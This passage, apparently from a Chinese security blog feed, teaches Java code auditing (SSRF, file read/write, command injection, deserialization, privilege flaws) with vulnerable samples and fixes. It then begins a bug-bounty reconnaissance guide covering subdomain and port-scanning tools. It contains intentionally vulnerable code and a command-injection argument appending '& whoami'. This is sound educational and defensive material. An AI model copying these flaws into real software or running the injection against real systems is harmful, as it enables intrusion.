title="修复"></a>修复</h3><ul><li>使用白名单检验，例如上面的代码增加正则匹配</li></ul><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!Pattern.matches(<span class="string">"[_a-bA-B0-9]+"</span>, user.getUserId()))</span><br><span class="line">if (!Pattern.matches(<span class="string">"[_a-bA-B0-9]+"</span>, user.getDescription()))</span><br></pre></td></tr></table></figure><ul><li>使用安全的XML库，使用dom4j来构建XML,dom4j会对文本数据域进行xml编码。</li></ul><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h3 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h3><p>代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。</p><p>java的SSRF利用方式比较局限:</p><ul><li>利用file协议任意文件读取。</li><li>利用http协议端口探测</li></ul><h3 id="支持的一些协议"><a href="#支持的一些协议" class="headerlink" title="支持的一些协议:"></a><strong>支持的一些协议:</strong></h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span> <span class="keyword">ftp</span> mailto <span class="keyword">http</span> <span class="keyword">https</span> jar netdoc</span><br></pre></td></tr></table></figure><p>举例:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String url = request.get<span class="constructor">Parameter(<span class="string">"url"</span>)</span>;</span><br><span class="line">         String htmlContent;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             URL u = <span class="keyword">new</span> <span class="constructor">URL(<span class="params">url</span>)</span>;</span><br><span class="line">             <span class="comment">//URL对象用openconnection()获得openConnection类对象。</span></span><br><span class="line">             URLConnection urlConnection = u.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br><span class="line">             HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</span><br><span class="line">             BufferedReader base = <span class="keyword">new</span> <span class="constructor">BufferedReader(<span class="params">new</span> InputStreamReader(<span class="params">httpUrl</span>.<span class="params">getInputStream</span>()</span>, <span class="string">"UTF-8"</span>));</span><br><span class="line">             <span class="comment">//用inputStream获取字节流然后使用InputStreamReader转化为字符流。</span></span><br><span class="line">             StringBuffer html = <span class="keyword">new</span> <span class="constructor">StringBuffer()</span>;</span><br><span class="line">             <span class="keyword">while</span> ((htmlContent = base.read<span class="constructor">Line()</span>) != null) &#123;</span><br><span class="line">                 html.append(htmlContent);</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure><p>漏洞代码四种情况</p><ul><li>Request</li></ul><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Request</span>.<span class="keyword">Get</span>(url).<span class="keyword">execute</span>()</span><br></pre></td></tr></table></figure><ul><li>openStream</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL u;</span><br><span class="line"><span class="built_in">int</span> length;</span><br><span class="line">byte<span class="literal">[]</span> <span class="built_in">bytes</span> = <span class="keyword">new</span> byte<span class="literal">[<span class="number">1024</span>]</span>;</span><br><span class="line">u = <span class="keyword">new</span> <span class="constructor">URL(<span class="params">url</span>)</span>;</span><br><span class="line">inputStream = u.<span class="keyword">open</span><span class="constructor">Stream()</span>;</span><br></pre></td></tr></table></figure><ul><li>HttpClient</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">"http://127.0.0.1"</span>;</span><br><span class="line">CloseableHttpClient client = <span class="module-access"><span class="module"><span class="identifier">HttpClients</span>.</span></span>create<span class="constructor">Default()</span>;</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> <span class="constructor">HttpGet(<span class="params">url</span>)</span>;</span><br><span class="line">HttpResponse httpResponse;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 该行代码发起网络请求</span></span><br><span class="line">    httpResponse = client.execute(httpGet);</span><br></pre></td></tr></table></figure><ul><li>URLConnection和HttpURLConnection</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLConnection urlConnection = url.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br><span class="line">HttpURLConnection urlConnection = url.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br></pre></td></tr></table></figure><h3 id="审计方法-3"><a href="#审计方法-3" class="headerlink" title="审计方法"></a>审计方法</h3><p>只要是能够对外发起网络请求的地方，就有可能会出现SSRF漏洞。重点查找以下函数。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpClient</span>.</span></span>execute</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpClient</span>.</span></span>executeMethod</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpURLConnection</span>.</span></span>connect</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpURLConnection</span>.</span></span>getInputStream</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">URL</span>.</span></span>openStream</span><br></pre></td></tr></table></figure><ul><li><code>new URL()</code>：构造一个url对象</li><li><code>openConnection()</code>:创建一个实例URLConncetion.</li><li><code>getInputStream()</code>：获取URL的字节流</li></ul><h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><ol><li>取URL的Host</li><li>取Host的IP</li><li>判断是否是内网IP，是内网IP直接return，不再往下执行</li><li>请求URL</li><li>如果有跳转，取出跳转URL，执行第1步</li><li>当判断完成最后会去请求URL </li></ol><h2 id="任意文件操作类漏洞"><a href="#任意文件操作类漏洞" class="headerlink" title="任意文件操作类漏洞"></a>任意文件操作类漏洞</h2><h3 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h3><p>​    常见的一些java文件操作类的漏洞:任意文件的读取、下载、删除、修改，这类漏洞的成因基本相同，都是因为程序没有对文件和目录的权限进行严格控制，或者说程序没有验证请求的资源文件是否合法导致的。</p><p>举例:</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a><strong>任意文件读取</strong></h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GET</span><br><span class="line">@<span class="constructor">Path(<span class="string">"/images/&#123;image&#125;"</span>)</span></span><br><span class="line">@<span class="constructor">Produces(<span class="string">"images/*"</span>)</span></span><br><span class="line">public Response get<span class="constructor">Image(@<span class="params">javax</span>.<span class="params">ws</span>.<span class="params">rs</span>.PathParam(<span class="string">"image"</span>)</span> String image) &#123;</span><br><span class="line">    File file = <span class="keyword">new</span> <span class="constructor">File(<span class="string">"resources/images/"</span>, <span class="params">image</span>)</span>; <span class="comment">//Weak point</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file.exists<span class="literal">()</span>) &#123;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Response</span>.</span></span>status(Status.NOT_FOUND).build<span class="literal">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Response</span>.</span></span>ok<span class="literal">()</span>.entity(<span class="keyword">new</span> <span class="constructor">FileInputStream(<span class="params">file</span>)</span>).build<span class="literal">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def get<span class="constructor">WordList(<span class="params">value</span>:String)</span> = Action &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="module-access"><span class="module"><span class="identifier">Files</span>.</span></span>exists(<span class="module-access"><span class="module"><span class="identifier">Paths</span>.</span></span>get(<span class="string">"public/lists/"</span> + value))) &#123;</span><br><span class="line">    <span class="constructor">NotFound(<span class="string">"File not found"</span>)</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">val</span> result = <span class="module-access"><span class="module"><span class="identifier">Source</span>.</span></span>from<span class="constructor">File(<span class="string">"public/lists/"</span> + <span class="params">value</span>)</span>.get<span class="constructor">Lines()</span>.mkString <span class="comment">// Weak point</span></span><br><span class="line">    <span class="constructor">Ok(<span class="params">result</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a><strong>任意文件写入</strong></h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(getExternalFilesDir(TARGET_TYPE), filename);</span><br><span class="line">fos = <span class="keyword">new</span> FileOutputStream(<span class="keyword">file</span>);</span><br><span class="line">fos.<span class="keyword">write</span>(confidentialData.getBytes());</span><br><span class="line">fos.flush();</span><br></pre></td></tr></table></figure><h3 id="审计方法-4"><a href="#审计方法-4" class="headerlink" title="审计方法"></a>审计方法</h3><p>全局搜索关键字或者方法</p><ul><li>FileInputStream</li><li>getPath</li><li>getAbsolutePath</li></ul><p>排查程序的安全策略配置文件，查找permission Java.io.FilePermission，<strong>查看IO方案是否只对程序的绝对路径赋予读写权限。</strong></p><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li>配置全局安全策略</li><li>使用File.getCanonicalPath()方法，该方法会对所有别名、快捷方式以及符号链接进行一致 地解析。特殊的文件名，例如“..”会被移除。</li></ul><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h3><p>服务端没有针对执行命令的函数进行过滤，导致攻击者可以提交恶意构造语句。java中常见如：<code>Runtime.exec() Process ProcessBuilder.start</code></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>Java中的命令执行离不开调用反射的机制，在实际的场景往往离不开反序列化的利用。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirList</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">String</span> dir = System.getProperty(“dir”);</span><br><span class="line">        <span class="built_in">Process</span> <span class="built_in">process</span> = null;</span><br><span class="line">        InputStream istream = null;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">process</span> = Runtime.getRuntime().exec(<span class="string">"cmd.exe /c dir"</span> + dir);</span><br><span class="line">            <span class="keyword">int</span> result = <span class="built_in">process</span>.waitFor();</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"process error: "</span> + result);</span><br><span class="line">            &#125;</span><br><span class="line">            istream = (result == <span class="number">0</span>) ? <span class="built_in">process</span>.getInputStream() : <span class="built_in">process</span>.getErrorStream();</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="built_in">buffer</span> = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> (istream.<span class="built_in">read</span>(<span class="built_in">buffer</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">                System.out.<span class="built_in">print</span>(<span class="keyword">new</span> <span class="keyword">String</span>(<span class="built_in">buffer</span>, “gb2312”));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            <span class="keyword">if</span> (istream != null) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    istream.<span class="built_in">close</span>();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">process</span> != null) &#123;</span><br><span class="line">                <span class="built_in">process</span>.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码利用<code>Runtime.exec()</code>方法调用dir命令。</p><p>攻击者可以利用&amp;符号执行多条命令，例如</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddir=<span class="string">"..\\ &amp; whoami</span></span><br></pre></td></tr></table></figure><h3 id="审计方法-5"><a href="#审计方法-5" class="headerlink" title="审计方法"></a>审计方法</h3><p>RCE出现的原因和场景很多，以后慢慢学习~</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、<span class="keyword">JST+EL等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">由java后端模板引擎注入导致的 </span>RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line"></span><br><span class="line">由<span class="keyword">java一些脚本语言引起的 </span>RCE 漏洞，常见的如：Groovy、<span class="keyword">JavascriptEngine等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">由第三方开源组件引起的 </span>RCE 漏洞，常见的如：Fastjson、<span class="keyword">Shiro、Xstream、Struts2、weblogic等</span></span><br></pre></td></tr></table></figure><p>审计的时候可以重点寻找：</p><ul><li>Runtime.exec()</li><li>Process</li><li>ProcessBuilder.start()</li></ul><h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><ul><li>正则表达式匹配用户输入</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="module-access"><span class="module"><span class="identifier">Pattern</span>.</span></span>matches(<span class="string">"[0-9A-Za-z@.]+"</span>, dir)) &#123;</span><br></pre></td></tr></table></figure><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h3><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h3 id="审计方法-6"><a href="#审计方法-6" class="headerlink" title="审计方法"></a>审计方法</h3><p>反序列化操作常常出现在<strong>导入模版文件、网络通信、数据传输、日志格式化存储或者数据库存储</strong>等业务功能处,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控。</p><ul><li>ObjectInputStream.readObject</li><li>ObjectInputStream.readUnshared</li><li>XMLDecoder.readObject</li><li>XStream.fromXML</li><li>第三方jar包:ObjectMapper.readValue,jackson中的JSON.parseObject,fastjson中的api</li></ul><h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><ul><li>升级服务端所依赖的可能被利用的jar包，包括JDK。</li><li>在执行反序列前对InputStream对象进行检查过滤</li></ul><h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><h3 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h3><p>​    <strong>中间件</strong>是提供系统软件和应用软件之间连接的软件，它将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</p><p>java常见的中间件:</p><p><img src="/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="审计方法-7"><a href="#审计方法-7" class="headerlink" title="审计方法"></a>审计方法</h3><p>直接打开pom.xml文件查看其 使用的中间件及其版本，然后到漏洞库里找漏洞即可。</p><img src="/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/QQ截图20210127114728.png" style="zoom: 50%;"><h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>及时更新项目使用的java中间件的版本。</p><h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><h3 id="成因-8"><a href="#成因-8" class="headerlink" title="成因"></a>成因</h3><p>​    常见的业务逻辑漏洞主要是越权，分为平行越权和垂直越权。在javaweb的各个功能点中都可能存在越权漏洞。</p><p>主要原因还是因为程序没有对当前用户的权限进行严格控制，或者是后台没有判断当前用户id。</p><h3 id="审计方法-8"><a href="#审计方法-8" class="headerlink" title="审计方法"></a>审计方法</h3><p>在每个<code>request.getParameter(&quot;userid&quot;);</code>之后查看是否有检验当前用户与要进行增删改查的用户。</p><h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>java中存在的安全问题还有很多，比如ldap注入、jndi注入、rmi反序列化等等会在后面的文章单独拿出来说，更多的java安全漏洞可以参考先知的java安全手书：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3372</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3460</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3416</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3358</span></span><br></pre></td></tr></table></figure><p>最后推荐一个自动化搜索java敏感函数的脚本:<a href="https://github.com/Cryin/JavaID" target="_blank" rel="noopener">Cryin/JavaID: java source code static code analysis and danger function identify prog (github.com)</a></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/jinqi520/p/10083441.html" target="_blank" rel="noopener">java代码审计中的一些常见漏洞及其特征函数 - 京亟QAQ - 博客园 (cnblogs.com)</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/</a></p><p><a href="https://xz.aliyun.com/t/7945#toc-13" target="_blank" rel="noopener">java代码审计 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/1633#toc-11" target="_blank" rel="noopener">JAVA代码审计的一些Tips(附脚本) - 先知社区 (aliyun.com)</a></p><p><a href="http://drops.xmd5.com/static/drops/web-16609.html" target="_blank" rel="noopener">JAVA安全之JAVA服务器安全漫谈 | WooYun知识库 (xmd5.com)</a></p><p><a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF - 先知社区 (aliyun.com)</a></p><p><a href="https://www.freebuf.com/articles/web/253139.html" target="_blank" rel="noopener">看一名Java开发人员以红队思维五分钟审计一套代码（续） - FreeBuf网络安全行业门户</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Java代码审计中常见的一些漏洞学习总结以及一些审计思路。&lt;/p&gt;
&lt;h3 id=&quot;java项目分层&quot;&gt;&lt;a href=&quot;#java项目分层
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SRC混子的漏洞挖掘之道</title>
    <link href="https://shu1l.github.io/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/"/>
    <id>https://shu1l.github.io/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/</id>
    <published>2021-01-16T13:36:41.000Z</published>
    <updated>2021-08-20T14:15:57.788Z</updated>
    
    <content type="html"><![CDATA[<p>本文首先于先知社区:<a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener">SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)</a></p><p>一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。</p><h3 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h3><p> 还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括<strong>企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话</strong>等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。</p><h4 id="企业相关信息收集"><a href="#企业相关信息收集" class="headerlink" title="企业相关信息收集"></a>企业相关信息收集</h4><ul><li>企查查 (<a href="https://www.qcc.com" target="_blank" rel="noopener">https://www.qcc.com）</a>/) </li></ul><ul><li>天眼查(<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a>)</li></ul><ul><li><p>启信宝（<a href="https://www.qixin.com/" target="_blank" rel="noopener">https://www.qixin.com/</a>)</p><p> 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p></li></ul><p><strong>主要查询的信息:</strong></p><ol><li>一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。</li><li>查看同电话企业基本都是子公司。</li><li>查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。</li><li>查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</li></ol><p>PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。</p><ul><li><p>站长之家:</p><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><ul><li>邮箱反查、注册人反查、电话反查。</li><li>推荐个项目:<a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> 兄弟域名查询。</li></ul></li><li><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener">https://www.qimai.cn/</a></p><ul><li>七麦数据，可以查到企业下一些比较冷门的app。</li></ul></li></ul><p><strong>信息整理</strong></p><p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息</p><ul><li><p>主公司及分公司、子公司下所有归属的网站域名信息；</p></li><li><p>主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。</p></li><li><p>主公司及分公司、子公司下所有的app资产和微信小程序。</p><p>之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p></li></ul><h4 id="子域名收集和网站信息收集"><a href="#子域名收集和网站信息收集" class="headerlink" title="子域名收集和网站信息收集"></a>子域名收集和网站信息收集</h4><p> 子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。</p><h5 id="通过github收集子域名"><a href="#通过github收集子域名" class="headerlink" title="通过github收集子域名"></a>通过github收集子域名</h5><p> 先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。</p><h5 id="oneforAll"><a href="#oneforAll" class="headerlink" title="oneforAll"></a>oneforAll</h5><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p><ul><li>需要到配置文件里填写api接口信息，</li><li>根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。</li></ul><p>命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span> run</span><br><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span>  <span class="params">--brute</span> <span class="literal">true</span> run</span><br></pre></td></tr></table></figure><p> 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。</p><h5 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h5><p>子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码，</p><p><a href="https://github.com/timwhitez/rad-xray" target="_blank" rel="noopener">https://github.com/timwhitez/rad-xray</a> 命令改一下能批量探测子域名，一般5到10分钟一个子域。</p><h5 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h5><p>官网:<a href="https://gobies.org/" target="_blank" rel="noopener">https://gobies.org/</a></p><p> 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0" target="_blank" rel="noopener">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。</span><br></pre></td></tr></table></figure><p> 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。</p><h5 id="BBScan"><a href="#BBScan" class="headerlink" title="BBScan"></a>BBScan</h5><p>猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。</p><p>项目地址:</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p><a href="https://github.com/yhy0/BBScan" 